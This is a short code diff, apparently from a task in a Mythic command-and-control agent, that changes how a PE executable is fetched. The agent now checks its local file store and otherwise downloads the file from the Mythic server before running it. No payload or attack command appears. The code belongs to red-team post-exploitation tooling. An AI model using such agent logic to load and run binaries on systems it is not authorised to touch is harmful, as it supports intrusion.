@@ -165,22 +165,17 @@ namespace Tasks
 
                 byte[]? peBytes;
 
-                if (!string.IsNullOrEmpty(parameters.PeId))
+                if(!_agent.GetFileManager().GetFileFromStore(parameters.PEName, out peBytes))
                 {
-                    if (!_agent.GetFileManager().GetFileFromStore(parameters.PeId, out peBytes))
+                    if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.PeId, out peBytes))
                     {
-                        if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.PeId, out peBytes))
-                        {
-                            _agent.GetFileManager().AddFileToStore(parameters.PeId, peBytes);
-                        }
+                        _agent.GetFileManager().AddFileToStore(parameters.PEName, peBytes);
+                    } else
+                    {
+                        throw new InvalidOperationException($"Failed to download {parameters.PEName} from Mythic");
                     }
                 }
-                else
-                {
-                    _agent.GetFileManager().GetFileFromStore(parameters.PEName, out peBytes);
-                }
 
-                peBytes = peBytes ?? throw new InvalidOperationException($"${parameters.PEName} is not loaded (have you registered it?)");
                 if (peBytes.Length == 0)
                 {
                     throw new InvalidOperationException($"{parameters.PEName} has a zero length (have you registered it?)");
